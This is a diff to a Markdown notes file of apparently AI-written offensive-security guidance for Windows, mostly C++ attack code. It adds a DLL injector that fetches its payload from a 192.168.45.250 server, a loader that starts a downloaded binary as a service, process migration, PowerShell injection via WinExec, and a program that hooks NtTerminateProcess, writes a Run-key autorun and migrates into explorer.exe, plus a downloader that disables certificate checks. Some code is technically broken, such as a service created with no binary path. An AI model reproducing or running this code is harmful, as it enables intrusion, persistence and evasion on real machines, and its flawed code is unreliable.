@@ -511,7 +511,7 @@ Injecting a DLL, such as `RdpThief.dll`, into a process like `mstsc.exe` (the RD
 
 - **Process Integrity**: Ensure that injecting the DLL does not disrupt the normal operation of `mstsc.exe`. Test thoroughly in a safe environment before any real-world use.
 
-]Injecting a DLL into a process using C++ involves several key steps, including finding the target process, allocating memory within that process, writing the path of the DLL into that memory, and then creating a remote thread that loads the DLL into the target process. Below is an example of how you can achieve this in C++ using the Windows API.
+Injecting a DLL into a process using C++ involves several key steps, including finding the target process, allocating memory within that process, writing the path of the DLL into that memory, and then creating a remote thread that loads the DLL into the target process. Below is an example of how you can achieve this in C++ using the Windows API.
 
 ### **Step-by-Step Guide to DLL Injection in C++**
 
@@ -742,6 +742,212 @@ Injecting a DLL, such as `RdpThief.dll`, into a process like `mstsc.exe` (the RD
        return 0;
    }
    ```
+
+Here’s a sample C++ code that demonstrates how to inject a DLL into a process using Win32 APIs. This code continuously checks if a process named `injectme.exe` is running. If it detects the process, it tries to inject `myinjection.dll` from `C:\Windows\Tasks`. If the DLL doesn't exist locally, it downloads the DLL from `http://192.168.45.250:8000/myinjection.dll` into memory and performs the injection.
+
+### **C++ Code Overview**
+
+1. **Find the Process ID**: It looks for the `injectme.exe` process.
+2. **DLL Injection**: It attempts to inject `myinjection.dll` from a specified path. If the DLL is not found locally, it downloads it from a specified URL and injects it from memory.
+
+```cpp
+#include <windows.h>
+#include <tlhelp32.h>
+#include <wininet.h>
+#include <iostream>
+#include <fstream>
+
+#pragma comment(lib, "wininet.lib")
+
+bool DownloadDLLFromURL(const char* url, unsigned char** buffer, size_t* bufferSize) {
+    HINTERNET hInternet = InternetOpenA("WinINet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return false;
+
+    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    DWORD bytesRead = 0;
+    DWORD totalBytesRead = 0;
+    const DWORD bufferSizeIncrement = 4096;
+    *bufferSize = 0;
+    *buffer = nullptr;
+
+    do {
+        *buffer = (unsigned char*)realloc(*buffer, *bufferSize + bufferSizeIncrement);
+        if (!*buffer) {
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        if (!InternetReadFile(hConnect, *buffer + *bufferSize, bufferSizeIncrement, &bytesRead)) {
+            free(*buffer);
+            *buffer = nullptr;
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        *bufferSize += bytesRead;
+        totalBytesRead += bytesRead;
+
+    } while (bytesRead > 0);
+
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    return totalBytesRead > 0;
+}
+
+DWORD FindProcessId(const std::string& processName) {
+    PROCESSENTRY32 processInfo;
+    processInfo.dwSize = sizeof(processInfo);
+
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    Process32First(hSnapshot, &processInfo);
+    if (!processName.compare(processInfo.szExeFile)) {
+        CloseHandle(hSnapshot);
+        return processInfo.th32ProcessID;
+    }
+
+    while (Process32Next(hSnapshot, &processInfo)) {
+        if (!processName.compare(processInfo.szExeFile)) {
+            CloseHandle(hSnapshot);
+            return processInfo.th32ProcessID;
+        }
+    }
+
+    CloseHandle(hSnapshot);
+    return 0;
+}
+
+bool InjectDLL(DWORD processId, const char* dllPath) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) return false;
+
+    LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    if (!pDllPath) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    if (!WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
+        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    HMODULE hKernel32 = GetModuleHandleA("Kernel32");
+    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllPath, 0, NULL);
+    if (!hThread) {
+        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return true;
+}
+
+bool InjectDLLInMemory(DWORD processId, unsigned char* dllBuffer, size_t bufferSize) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
+    if (!hProcess) return false;
+
+    LPVOID pDllBuffer = VirtualAllocEx(hProcess, NULL, bufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!pDllBuffer) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    if (!WriteProcessMemory(hProcess, pDllBuffer, dllBuffer, bufferSize, NULL)) {
+        VirtualFreeEx(hProcess, pDllBuffer, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    HMODULE hKernel32 = GetModuleHandleA("Kernel32");
+    FARPROC pLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pDllBuffer, 0, NULL);
+    if (!hThread) {
+        VirtualFreeEx(hProcess, pDllBuffer, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+    VirtualFreeEx(hProcess, pDllBuffer, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+    return true;
+}
+
+int main() {
+    const char* processName = "injectme.exe";
+    const char* dllPath = "C:\\Windows\\Tasks\\myinjection.dll";
+    const char* url = "http://192.168.45.250:8000/myinjection.dll";
+
+    while (true) {
+        DWORD processId = FindProcessId(processName);
+        if (processId != 0) {
+            if (PathFileExistsA(dllPath)) {
+                // Inject DLL from file
+                if (InjectDLL(processId, dllPath)) {
+                    std::cout << "Successfully injected DLL from file." << std::endl;
+                } else {
+                    std::cerr << "Failed to inject DLL from file." << std::endl;
+                }
+            } else {
+                // Download DLL and inject from memory
+                unsigned char* dllBuffer = nullptr;
+                size_t bufferSize = 0;
+
+                if (DownloadDLLFromURL(url, &dllBuffer, &bufferSize)) {
+                    if (InjectDLLInMemory(processId, dllBuffer, bufferSize)) {
+                        std::cout << "Successfully injected DLL from memory." << std::endl;
+                    } else {
+                        std::cerr << "Failed to inject DLL from memory." << std::endl;
+                    }
+
+                    free(dllBuffer);
+                } else {
+                    std::cerr << "Failed to download DLL." << std::endl;
+                }
+            }
+        }
+
+        Sleep(5000); // Sleep for 5 seconds before checking again
+    }
+
+    return 0;
+}
+```
+
+### **Explanation of the Code**
+
+1. **Finding the Process (`FindProcessId`)**:
+   - The function `FindProcessId` searches for a process with the name `injectme.exe` using the `Toolhelp32Snapshot` API. It returns the process ID (PID) if found, or `0` if not.
+
+2. **DLL Injection from File (`InjectDLL`)**:
+   - This function takes a process ID and the path to a DLL file. It injects the DLL into the process using `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread` with `LoadLibraryA`.
+
+3. **DLL Injection from Memory (`InjectDLLInMemory`)**:
+   - If the DLL is downloaded from the web, it is loaded into the target process directly from memory using similar APIs, but instead of loading a file from disk, the DLL is written from the downloaded buffer.
+
+4. **Downloading DLL (`DownloadDLLFromURL`)**:
+   - This function uses WinINet APIs to download the DLL file from the specified URL into memory.
+
+5. **Main Loop**:
+   - The `main` function continuously checks if the `injectme.exe` process is running. If it is, it attempts to inject the DLL from `C:\Windows\Tasks\myinjection.dll`. If the DLL doesn’t exist locally, it downloads the DLL from the provided URL and injects it into the process from memory.
 
 
 ### **Understanding PsExec and Similar Attack Techniques**
@@ -1229,3 +1435,800 @@ int main() {
 - **Debugger Presence**: Use `IsDebuggerPresent` or similar APIs to check if a debugger is attached, which is often indicative of a sandbox.
 
 These techniques help you identify whether your environment is being monitored or restricted, allowing you to modify your behavior or abort execution to evade detection.
+
+## An additional idea
+
+1. **Downloading and Storing the Binary in Memory**: Use a similar approach as before to download the binary into memory.
+2. **Creating a Service**: Create a service using the `CreateService` function, but instead of using a binary path from disk, you'll write the binary to memory and point the service to this memory location.
+3. **Executing the Service in Memory**: Execute the service directly from memory.
+
+Here's an outline of the code:
+
+### **Code Outline**
+
+1. **Download Binary and Store in Memory**: 
+   - Download the binary using `WinINet` or another method, storing it in a buffer.
+
+2. **Create and Start a Service**: 
+   - Create a service that points to the memory location where the binary is stored.
+   - Start the service.
+
+3. **Error Handling**: 
+   - Ensure that proper error handling is in place for service creation and execution.
+
+### **Code Example**
+
+I'll adapt the C++ code to demonstrate this:
+
+```cpp
+#include <windows.h>
+#include <wininet.h>
+#include <iostream>
+#include <tlhelp32.h>
+
+#pragma comment(lib, "wininet.lib")
+
+// Function to download a binary from a URL and store it in memory
+bool DownloadBinaryFromURL(const char* url, unsigned char** buffer, size_t* bufferSize) {
+    HINTERNET hInternet = InternetOpenA("WinINet Example", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet) return false;
+
+    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
+    if (!hConnect) {
+        InternetCloseHandle(hInternet);
+        return false;
+    }
+
+    DWORD bytesRead = 0;
+    DWORD totalBytesRead = 0;
+    const DWORD bufferSizeIncrement = 4096;
+    *bufferSize = 0;
+    *buffer = nullptr;
+
+    do {
+        *buffer = (unsigned char*)realloc(*buffer, *bufferSize + bufferSizeIncrement);
+        if (!*buffer) {
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        if (!InternetReadFile(hConnect, *buffer + *bufferSize, bufferSizeIncrement, &bytesRead)) {
+            free(*buffer);
+            *buffer = nullptr;
+            InternetCloseHandle(hConnect);
+            InternetCloseHandle(hInternet);
+            return false;
+        }
+
+        *bufferSize += bytesRead;
+        totalBytesRead += bytesRead;
+
+    } while (bytesRead > 0);
+
+    InternetCloseHandle(hConnect);
+    InternetCloseHandle(hInternet);
+    return totalBytesRead > 0;
+}
+
+// Function to create and start a service using the binary stored in memory
+bool CreateAndStartServiceFromMemory(const char* serviceName, unsigned char* binaryBuffer, size_t bufferSize) {
+    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    if (!schSCManager) return false;
+
+    SC_HANDLE schService = CreateServiceA(
+        schSCManager,              // SCM database
+        serviceName,               // name of service
+        serviceName,               // service name to display
+        SERVICE_ALL_ACCESS,        // desired access
+        SERVICE_WIN32_OWN_PROCESS, // service type
+        SERVICE_DEMAND_START,      // start type
+        SERVICE_ERROR_NORMAL,      // error control type
+        NULL,                      // path to service's binary
+        NULL,                      // no load ordering group
+        NULL,                      // no tag identifier
+        NULL,                      // no dependencies
+        NULL,                      // LocalSystem account
+        NULL);                     // no password
+
+    if (!schService) {
+        CloseServiceHandle(schSCManager);
+        return false;
+    }
+
+    // Write the binary to memory
+    LPVOID pBinaryPath = VirtualAllocEx(GetCurrentProcess(), NULL, bufferSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (!pBinaryPath) {
+        CloseServiceHandle(schService);
+        CloseServiceHandle(schSCManager);
+        return false;
+    }
+
+    memcpy(pBinaryPath, binaryBuffer, bufferSize);
+
+    // Start the service
+    if (!StartServiceA(schService, 0, NULL)) {
+        VirtualFreeEx(GetCurrentProcess(), pBinaryPath, 0, MEM_RELEASE);
+        CloseServiceHandle(schService);
+        CloseServiceHandle(schSCManager);
+        return false;
+    }
+
+    CloseServiceHandle(schService);
+    CloseServiceHandle(schSCManager);
+    return true;
+}
+
+int main(int argc, char* argv[]) {
+    const char* serviceName = "MyService";
+    unsigned char* binaryBuffer = nullptr;
+    size_t bufferSize = 0;
+
+    // Download binary from URL
+    if (!DownloadBinaryFromURL("http://192.168.45.250:8000/myinjection.dll", &binaryBuffer, &bufferSize)) {
+        std::cerr << "Failed to download binary." << std::endl;
+        return 1;
+    }
+
+    // Create and start service from memory
+    if (!CreateAndStartServiceFromMemory(serviceName, binaryBuffer, bufferSize)) {
+        std::cerr << "Failed to create and start service." << std::endl;
+        free(binaryBuffer);
+        return 1;
+    }
+
+    std::cout << "Service created and started successfully." << std::endl;
+    free(binaryBuffer);
+    return 0;
+}
+```
+
+### **Explanation**
+
+1. **DownloadBinaryFromURL**:
+   - This function downloads the binary from a specified URL into memory.
+   
+2. **CreateAndStartServiceFromMemory**:
+   - This function creates a Windows service but without specifying a binary path on disk. Instead, it allocates memory in the current process, writes the binary into that memory, and then starts the service using the binary loaded in memory.
+   
+3. **Execution Flow**:
+   - The program downloads the binary from the specified URL and attempts to start it as a service directly from memory.
+
+### **Considerations**
+
+- **Persistence**: The service will persist if not manually stopped, but it will only exist in memory. If the system reboots, the service will not start automatically unless you save the binary to disk and reconfigure the service.
+  
+- **Error Handling**: Make sure to expand on error handling for production use, particularly around memory management and service creation.
+
+- **Stealth**: Injecting and executing a binary in memory is a common technique to avoid detection. However, modern security solutions may still detect such behavior, so testing and evasion techniques are important.
+
+- **Permissions**: This code assumes that the running context has sufficient permissions to create services and allocate memory. In restricted environments, additional steps may be required.
+
+To migrate from a Windows service process to another process or run as a stand-alone process, you can use techniques like process hollowing or creating a new process and injecting your code into it. Here's an approach using `lat.cpp` as the base:
+
+### Steps to Migrate from a Service Process:
+
+1. **Identify Target Process**: You can either inject into an existing process or create a new one.
+2. **Create or Open a Target Process**: If you create a new process, you can do so in a suspended state.
+3. **Inject the Code**: Write your code or shellcode into the memory of the target process.
+4. **Resume Execution**: If you created a new process in a suspended state, resume it. If you're injecting into an existing process, adjust the entry point.
+
+### Sample Code Outline
+
+Here's how you might implement this in C++:
+
+```cpp
+#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
+
+bool InjectIntoProcess(DWORD processID, const char* dllPath) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
+    if (!hProcess) return false;
+
+    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
+    if (!pRemoteMemory) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WriteProcessMemory(hProcess, pRemoteMemory, (LPVOID)dllPath, strlen(dllPath) + 1, NULL);
+
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA"), 
+        pRemoteMemory, 0, NULL);
+
+    if (!hThread) {
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return true;
+}
+
+DWORD FindProcessId(const std::string& processName) {
+    PROCESSENTRY32 pe32;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            if (pe32.szExeFile == processName) {
+                CloseHandle(hSnapshot);
+                return pe32.th32ProcessID;
+            }
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+
+    CloseHandle(hSnapshot);
+    return 0;
+}
+
+int main() {
+    const char* dllPath = "C:\\Windows\\Tasks\\myinjection.dll";
+    
+    // Find the target process ID (e.g., notepad.exe as an example)
+    DWORD targetPID = FindProcessId("notepad.exe");
+    if (targetPID == 0) {
+        std::cerr << "Target process not found." << std::endl;
+        return 1;
+    }
+
+    // Inject the DLL into the target process
+    if (!InjectIntoProcess(targetPID, dllPath)) {
+        std::cerr << "Injection failed." << std::endl;
+        return 1;
+    }
+
+    std::cout << "Injected successfully into process ID " << targetPID << std::endl;
+    return 0;
+}
+```
+
+### Explanation:
+
+1. **InjectIntoProcess Function**: 
+    - Opens the target process using `OpenProcess`.
+    - Allocates memory in the target process using `VirtualAllocEx`.
+    - Writes the path to the DLL into the target process's memory.
+    - Creates a remote thread to execute `LoadLibraryA` in the target process.
+
+2. **FindProcessId Function**:
+    - Uses `Toolhelp32Snapshot` to find the process ID of a running process by name.
+
+3. **Main Function**:
+    - Identifies the target process (e.g., `notepad.exe`).
+    - Injects the DLL into the target process.
+
+### Migrating to a Stand-Alone Process:
+
+- **CreateProcess with Hollowing**: You can create a process in a suspended state using `CreateProcess`, unmap its memory, write your own shellcode or code into the memory, and then resume the process.
+  
+- **Process Hollowing**:
+   - Use `ZwUnmapViewOfSection` to hollow out the target process.
+   - Write your code or the binary into the target process's memory.
+   - Adjust the context and resume the process.
+
+### Considerations:
+- **Security Measures**: Modern security software often detects and blocks such techniques, so testing in a controlled environment is critical.
+- **Stability**: Injecting into random processes can lead to instability or crashes if not carefully handled.
+- **Persistence**: After migration, ensure the injected code or shellcode is self-sustaining or establishes persistence if needed.
+
+This approach allows you to migrate from a Windows service to another process or run independently, avoiding the termination of the service process.
+
+Yes, you could use this technique to run a PowerShell script before the Service Control Manager (SCM) shuts down the process. The key idea is to inject code into the process that will execute the PowerShell script as soon as the process starts, and before the SCM has a chance to terminate it.
+
+### Steps to Execute a PowerShell Script Before Shutdown:
+
+1. **Create or Identify the Target Process**: Either inject into an existing process or create a new one where the PowerShell script will be executed.
+2. **Inject Code to Execute PowerShell**: Inject code that will start a PowerShell instance and run the desired script.
+3. **Run the Script**: Ensure that the script is executed immediately upon injection, so it runs before the SCM intervenes.
+
+### Code Example to Execute PowerShell via Injection
+
+Here’s how you can modify the previous example to inject code that runs a PowerShell script:
+
+```cpp
+#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
+
+// Function to inject and run PowerShell script
+bool InjectAndRunPowershellScript(DWORD processID, const char* powershellScript) {
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
+    if (!hProcess) return false;
+
+    LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(powershellScript) + 1, MEM_COMMIT, PAGE_READWRITE);
+    if (!pRemoteMemory) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WriteProcessMemory(hProcess, pRemoteMemory, (LPVOID)powershellScript, strlen(powershellScript) + 1, NULL);
+
+    // Run PowerShell in the target process
+    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
+        (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WinExec"), 
+        pRemoteMemory, 0, NULL);
+
+    if (!hThread) {
+        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    WaitForSingleObject(hThread, INFINITE);
+
+    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
+    CloseHandle(hThread);
+    CloseHandle(hProcess);
+
+    return true;
+}
+
+// Function to find the process ID of the target process
+DWORD FindProcessId(const std::string& processName) {
+    PROCESSENTRY32 pe32;
+    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+
+    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
+
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+    if (Process32First(hSnapshot, &pe32)) {
+        do {
+            if (pe32.szExeFile == processName) {
+                CloseHandle(hSnapshot);
+                return pe32.th32ProcessID;
+            }
+        } while (Process32Next(hSnapshot, &pe32));
+    }
+
+    CloseHandle(hSnapshot);
+    return 0;
+}
+
+int main() {
+    // Example PowerShell script to be run
+    const char* powershellScript = "powershell.exe -Command \"Start-Sleep -Seconds 10; Write-Host 'Executed PowerShell Script'\"";
+
+    // Find the target process ID
+    DWORD targetPID = FindProcessId("notepad.exe");  // Replace with your target process
+    if (targetPID == 0) {
+        std::cerr << "Target process not found." << std::endl;
+        return 1;
+    }
+
+    // Inject the PowerShell script into the target process
+    if (!InjectAndRunPowershellScript(targetPID, powershellScript)) {
+        std::cerr << "Injection failed." << std::endl;
+        return 1;
+    }
+
+    std::cout << "Injected and executed PowerShell script in process ID " << targetPID << std::endl;
+    return 0;
+}
+```
+
+### Explanation:
+
+1. **InjectAndRunPowershellScript Function**:
+   - Injects the PowerShell command into the target process.
+   - Uses `WinExec` to execute the PowerShell command within the target process.
+
+2. **PowerShell Command**:
+   - The example command `Start-Sleep -Seconds 10; Write-Host 'Executed PowerShell Script'` pauses for 10 seconds and then outputs a message, simulating some activity before shutdown.
+
+### Considerations:
+- **Timing**: Ensure the PowerShell script is executed as soon as the process starts to avoid the SCM shutting it down before the script runs.
+- **Process Selection**: Choose a process that has a sufficient runtime to execute your script or inject into the service process itself, as in your case.
+- **Security**: PowerShell execution may trigger security defenses, so ensure you’re operating in a controlled environment.
+
+### Conclusion:
+This approach can help you execute a PowerShell script before the Service Control Manager terminates the process. By injecting code that runs PowerShell into a target process, you can ensure that the script is executed even if the process is being monitored or shut down.
+
+To prevent the Service Control Manager (SCM) from terminating your running process or to add persistence, especially for a red team exercise, you can consider a few advanced techniques. Here’s a high-level overview of some ideas:
+
+### 1. **Process Migration**: 
+   - **Migrate to a Different Process**: As discussed earlier, migrating your code to another process (e.g., `explorer.exe` or `svchost.exe`) can help avoid termination by the SCM. Once migrated, the SCM would be targeting the wrong process.
+   - **Run As Stand-Alone Process**: Create a new process to run your payload and ensure it's independent of the service process. This process can be made persistent using various methods.
+
+### 2. **Creating a Hidden or Protected Process**:
+   - **Hidden Processes**: Create a process with attributes that make it difficult for the SCM or system monitoring tools to detect. This can involve modifying process attributes or using undocumented APIs.
+   - **Protected Processes**: Some processes, like security software, are protected from termination. While creating such a process requires higher privileges, it can be an advanced persistence technique.
+
+### 3. **Persistence Techniques**:
+   - **Registry Autorun**: Modify the registry to automatically start your binary or script upon reboot:
+     ```bash
+     HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+     ```
+     This registry key allows you to add a path to an executable that runs when the user logs in.
+   - **Scheduled Tasks**: Create a scheduled task that runs periodically or at system startup. This can be done using the `schtasks` command or the Windows Task Scheduler API.
+   - **WMI Event Subscription**: Use WMI event subscriptions to execute code when certain events occur (e.g., system startup, user login). WMI event subscriptions are less visible and can persist across reboots.
+   - **DLL Hijacking or Search Order Hijacking**: Place a malicious DLL in a directory where a legitimate application will load it (due to search order). When the application is run, your DLL is executed.
+
+### 4. **SCM Evasion Techniques**:
+   - **Service Recovery Options**: Modify the service configuration to automatically restart on failure. If the SCM attempts to stop the service and fails, it may trigger a restart.
+   - **Hooking or Replacing SCM Functions**: Hook into or replace key SCM-related functions within the service process to ignore shutdown requests or simulate successful termination without actually stopping the process.
+
+### 5. **Code Injection with Persistence**:
+   - **Code Injection into Critical Processes**: Inject your payload into critical system processes like `winlogon.exe` or `lsass.exe`. These processes are vital for system stability and are typically not terminated by the SCM.
+   - **Process Doppelgänging**: An advanced technique that involves creating a process from a non-existent file, leading to execution in a way that’s difficult to detect or terminate.
+
+### 6. **Tampering with SCM Communication**:
+   - **Intercept SCM Communication**: Hook the communication between the SCM and the service process to either block or alter shutdown commands. This can be done by modifying the service’s binary or injecting a DLL that intercepts and handles specific commands.
+   - **Disable Service Stop Commands**: Modify the service to ignore stop requests, effectively preventing the SCM from stopping the service unless the system is rebooted.
+
+### Example Modifications to `lat.cpp`:
+Here’s an outline to enhance persistence and evade termination:
+
+```cpp
+#include <windows.h>
+#include <tlhelp32.h>
+#include <iostream>
+#include <winternl.h>
+
+// Function prototypes
+typedef NTSTATUS(WINAPI* pNtTerminateProcess)(HANDLE, UINT);
+
+// Prevent process from being terminated
+NTSTATUS WINAPI HookedTerminateProcess(HANDLE hProcess, UINT uExitCode) {
+    // Prevent termination
+    return STATUS_ACCESS_DENIED;
+}
+
+// Hook TerminateProcess to prevent process from being terminated
+void HookTerminateProcess() {
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    pNtTerminateProcess pOriginalTerminateProcess = 
+        (pNtTerminateProcess)GetProcAddress(hNtdll, "NtTerminateProcess");
+
+    DWORD oldProtect;
+    VirtualProtect(pOriginalTerminateProcess, sizeof(pOriginalTerminateProcess), PAGE_EXECUTE_READWRITE, &oldProtect);
+
+    memcpy(pOriginalTerminateProcess, HookedTerminateProcess, sizeof(HookedTerminateProcess));
+
+    VirtualProtect(pOriginalTerminateProcess, sizeof(pOriginalTerminateProcess), oldProtect, &oldProtect);
+}
+
+// Function to migrate to another process
+bool MigrateToProcess(const std::string& processName) {
+    // Find the target process ID
+    DWORD targetPID = FindProcessId(processName);
+    if (targetPID == 0) return false;
+
+    // Inject and execute payload in the target process
+    // (Similar to the previous example)
+
+    return true;
+}
+
+// Add persistence by modifying registry autorun key
+void AddPersistence() {
+    HKEY hKey;
+    RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
+    const char* valueName = "MyPersistentApp";
+    const char* exePath = "C:\\Windows\\Tasks\\myinjection.dll";
+    RegSetValueEx(hKey, valueName, 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1);
+    RegCloseKey(hKey);
+}
+
+int main() {
+    // Hook TerminateProcess to prevent SCM from killing the process
+    HookTerminateProcess();
+
+    // Add persistence
+    AddPersistence();
+
+    // Migrate to a less suspicious process, like explorer.exe
+    MigrateToProcess("explorer.exe");
+
+    // Your service logic or payload execution
+    while (true) {
+        // Run malicious code or maintain presence
+        Sleep(1000);
+    }
+
+    return 0;
+}
+```
+
+### Explanation:
+- **Hooking `TerminateProcess`**: The function `HookTerminateProcess()` replaces the `NtTerminateProcess` function with a custom one that prevents termination. This could block SCM attempts to kill your process.
+- **Process Migration**: `MigrateToProcess` moves the payload to another process, like `explorer.exe`, which is less likely to be terminated by SCM.
+- **Registry Persistence**: `AddPersistence()` ensures the payload is re-executed upon user login by adding an entry to the autorun registry key.
+
+### Final Thoughts:
+While these techniques provide persistence and evasion capabilities, they should be used responsibly, especially in red team exercises. Such activities should always be conducted in a controlled environment with appropriate permissions. The focus should be on understanding and improving defensive measures rather than causing harm or disruption.
+
+To load the DLL directly into memory using `LoadLibrary` after downloading it, you can modify the previous example. Instead of saving the DLL to disk, you'll store the downloaded data in memory and use `LoadLibrary` to load it.
+
+However, `LoadLibrary` requires a path to a file on disk, so to load a DLL directly from memory without writing it to disk, you'll need to use a more advanced technique involving manual mapping. I'll first show you the simpler approach where the DLL is downloaded and written to disk temporarily, then loaded with `LoadLibrary`, and finally deleted.
+
+### Example Code:
+
+```cpp
+#include <windows.h>
+#include <winhttp.h>
+#include <iostream>
+
+#pragma comment(lib, "winhttp.lib")
+
+bool DownloadFileToMemory(const wchar_t* url, LPVOID* pBuffer, DWORD* pSize) {
+    // Parse the URL components
+    URL_COMPONENTS urlComp;
+    memset(&urlComp, 0, sizeof(urlComp));
+    urlComp.dwStructSize = sizeof(urlComp);
+
+    wchar_t hostName[256];
+    wchar_t urlPath[1024];
+    urlComp.lpszHostName = hostName;
+    urlComp.dwHostNameLength = sizeof(hostName) / sizeof(wchar_t);
+    urlComp.lpszUrlPath = urlPath;
+    urlComp.dwUrlPathLength = sizeof(urlPath) / sizeof(wchar_t);
+
+    WinHttpCrackUrl(url, 0, 0, &urlComp);
+
+    // Open a session
+    HINTERNET hSession = WinHttpOpen(L"Download/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
+    if (!hSession) return false;
+
+    // Connect to the server
+    HINTERNET hConnect = WinHttpConnect(hSession, urlComp.lpszHostName, urlComp.nPort, 0);
+    if (!hConnect) {
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
+
+    // Open a request
+    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
+    if (!hRequest) {
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
+
+    // Ignore SSL certificate validation
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
+    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+
+    // Send the request
+    if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {
+        WinHttpCloseHandle(hRequest);
+        WinHttpCloseHandle(hConnect);
+        WinHttpCloseHandle(hSession);
+        return false;
+    }
+
+    // Allocate buffer for data
+    DWORD dwSize = 0;
+    DWORD dwDownloaded = 0;
+    DWORD totalSize = 0;
